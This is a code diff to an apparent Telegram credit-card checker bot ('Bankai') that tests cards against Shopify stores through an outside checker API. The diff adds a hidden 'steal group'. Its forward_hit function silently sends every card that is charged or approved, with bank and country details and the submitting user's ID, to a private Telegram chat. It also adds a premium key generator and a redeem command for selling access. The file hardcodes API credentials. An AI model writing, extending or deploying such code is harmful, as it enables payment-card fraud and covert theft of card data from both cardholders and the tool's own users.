@@ -29,9 +29,11 @@ API_HASH   = '868242502bea6a1e41b2ce46001d0580'
 CHECKER_API = 'https://web-production-1b828.up.railway.app/shopify'
 
 OWNER_ID       = 5895386985
+STEAL_GROUP    = -1003769047965   # hits forwarded here
 PREMIUM_FILE   = 'bankai_premium.txt'
 PROXY_FILE     = 'proxy.txt'
 SOULS_FILE     = 'soul_data.json'
+KEYS_FILE      = 'bankai_keys.json'
 
 # ============================================================================
 # 🌟 SOUL DATA MANAGEMENT
@@ -66,6 +68,40 @@ def update_soul(user_id, soul):
     souls = load_souls()
     souls[str(user_id)] = soul
     save_souls(souls)
+
+# ============================================================================
+# 🔑 KEY MANAGEMENT
+# ============================================================================
+
+def load_keys():
+    if not os.path.exists(KEYS_FILE):
+        return {}
+    try:
+        with open(KEYS_FILE, 'r') as f:
+            return json.load(f)
+    except:
+        return {}
+
+def save_keys(data):
+    with open(KEYS_FILE, 'w') as f:
+        json.dump(data, f, indent=2)
+
+def generate_key():
+    import secrets, string
+    chars = string.ascii_uppercase + string.digits
+    parts = [''.join(secrets.choice(chars) for _ in range(4)) for _ in range(4)]
+    return 'BANKAI-' + '-'.join(parts)
+
+def add_premium(user_id: int):
+    lines = []
+    if os.path.exists(PREMIUM_FILE):
+        with open(PREMIUM_FILE, 'r') as f:
+            lines = [l.strip() for l in f if l.strip()]
+    uid = str(user_id)
+    if uid not in lines:
+        lines.append(uid)
+        with open(PREMIUM_FILE, 'w') as f:
+            f.write('\n'.join(lines) + '\n')
 
 def get_rank(soul):
     c = soul['checks']
@@ -163,6 +199,38 @@ async def zanpakuto_check(card: str, proxy: str = "") -> dict:
     except Exception as e:
         return {'status': 'ERROR', 'raw': str(e), 'gate': '-',
                 'price': '-', 'site': '-', 'time': '-', 'code': 'EXCEPTION'}
+
+async def forward_hit(card: str, result: dict, user_id: int, bin_info: dict = {}):
+    """Forward CHARGED/APPROVED hits to the steal group."""
+    st       = result['status']
+    emoji    = "💎" if st == 'CHARGED' else "✅"
+    label    = "CHARGED — ORDER PLACED" if st == 'CHARGED' else "APPROVED — CCN LIVE"
+    bank     = bin_info.get('bank', '—')
+    brand    = bin_info.get('brand', '—')
+    country  = bin_info.get('country_name', '—')
+    flag     = bin_info.get('country_flag', '')
+
+    msg = (
+        f"<b>{emoji} 『 BANKAI HIT 』 {emoji}</b>\n"
+        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
+        f"<b>⚫ Status:</b>  {label}\n"
+        f"<b>💳 Card:</b>   <code>{card}</code>\n"
+        f"<b>🏦 Gate:</b>   {result.get('gate', '—')}\n"
+        f"<b>💰 Price:</b>  {result.get('price', '—')}\n"
+        f"<b>🌐 Site:</b>   {result.get('site', '—')}\n"
+        f"<b>⏱️ Time:</b>   {result.get('time', '—')}\n\n"
+        f"<b>🏦 Bank:</b>   {bank}\n"
+        f"<b>💠 Brand:</b>  {brand} {flag}\n"
+        f"<b>🌍 Country:</b>{country}\n\n"
+        f"<b>👤 Checker:</b> <code>{user_id}</code>"
+    )
+    if st == 'CHARGED' and result.get('receipt'):
+        msg += f"\n<b>🧾 Receipt:</b> {result['receipt']}"
+
+    try:
+        await bot.send_message(STEAL_GROUP, msg, parse_mode='html')
+    except Exception:
+        pass
 
 async def get_bin_info(card_number: str) -> dict:
     """Get BIN info"""
@@ -336,6 +404,9 @@ async def check_single(event):
 
         await status_msg.edit(out, parse_mode='html')
 
+        if st in ('CHARGED', 'APPROVED'):
+            await forward_hit(card, result, user_id, bin_info)
+
     except Exception as e:
         await status_msg.edit(
             f"<b>❌ Zanpakuto Malfunction</b>\n\n<code>{str(e)[:150]}</code>",
@@ -411,9 +482,11 @@ async def check_file(event):
             if st == 'CHARGED':
                 results['charged'] += 1
                 hits.append(f"💎 CHARGED | {card} | {result['site']} | {result['price']}")
+                await forward_hit(card, result, user_id)
             elif st == 'APPROVED':
                 results['approved'] += 1
                 hits.append(f"✅ APPROVED | {card} | {result['site']}")
+                await forward_hit(card, result, user_id)
             elif st == 'DECLINED':
                 results['declined'] += 1
             else:
@@ -689,6 +762,94 @@ async def stop_handler(event):
         active_sessions[sid]['stopped'] = True
         del active_sessions[sid]
     await event.answer("🛑 Stopping...", alert=False)
+
+# ============================================================================
+# 🔑 /genkey - OWNER ONLY KEY GENERATOR
+# ============================================================================
+
+@bot.on(events.NewMessage(pattern=r'^/genkey'))
+async def genkey_handler(event):
+    user_id = event.sender_id
+    if user_id != OWNER_ID:
+        await event.reply("<b>⛔ Soul King Access Only</b>", parse_mode='html')
+        return
+
+    text  = event.message.text.strip().split()
+    count = int(text[1]) if len(text) > 1 and text[1].isdigit() else 1
+    count = min(count, 20)
+
+    keys_data = load_keys()
+    new_keys  = []
+    for _ in range(count):
+        key = generate_key()
+        keys_data[key] = {'used': False, 'used_by': None, 'created': datetime.now().isoformat()}
+        new_keys.append(key)
+    save_keys(keys_data)
+
+    key_lines = '\n'.join(f"<code>{k}</code>" for k in new_keys)
+    await event.reply(
+        f"<b>🔑 『 SOUL KEYS GENERATED 』</b>\n\n"
+        f"<b>Count:</b> {count}\n\n"
+        f"{key_lines}\n\n"
+        f"<b>Users redeem with:</b> <code>/redeem KEY</code>",
+        parse_mode='html'
+    )
+
+# ============================================================================
+# 🔓 /redeem - REDEEM PREMIUM KEY
+# ============================================================================
+
+@bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
+async def redeem_handler(event):
+    user_id = event.sender_id
+    key     = event.message.text.replace('/redeem', '').strip().upper()
+
+    if is_premium(user_id):
+        await event.reply("<b>✅ You already have Bankai access!</b>", parse_mode='html')
+        return
+
+    keys_data = load_keys()
+    if key not in keys_data:
+        await event.reply(
+            "<b>❌ Invalid Key</b>\n\nThis Soul Key does not exist.",
+            parse_mode='html'
+        )
+        return
+
+    if keys_data[key]['used']:
+        await event.reply(
+            "<b>❌ Key Already Used</b>\n\nThis Soul Key has already been redeemed.",
+            parse_mode='html'
+        )
+        return
+
+    keys_data[key]['used']    = True
+    keys_data[key]['used_by'] = user_id
+    keys_data[key]['used_at'] = datetime.now().isoformat()
+    save_keys(keys_data)
+    add_premium(user_id)
+
+    await event.reply(
+        f"<b>🔥 『 BANKAI UNLOCKED 』🔥</b>\n\n"
+        f"<b>✅ Key accepted!</b>\n"
+        f"<b>💜 Soul ID:</b> <code>{user_id}</code>\n\n"
+        f"You now have full Zanpakuto Arsenal access:\n"
+        f"• /cc — Single card check\n"
+        f"• /chk — Batch file check\n\n"
+        f"<b>⚫ Welcome to Soul Society, Reaper!</b>",
+        parse_mode='html'
+    )
+
+    try:
+        await bot.send_message(
+            OWNER_ID,
+            f"<b>🔑 Key Redeemed</b>\n\n"
+            f"<b>Key:</b> <code>{key}</code>\n"
+            f"<b>User:</b> <code>{user_id}</code>",
+            parse_mode='html'
+        )
+    except Exception:
+        pass
 
 # ============================================================================
 # 🚀 STARTUP
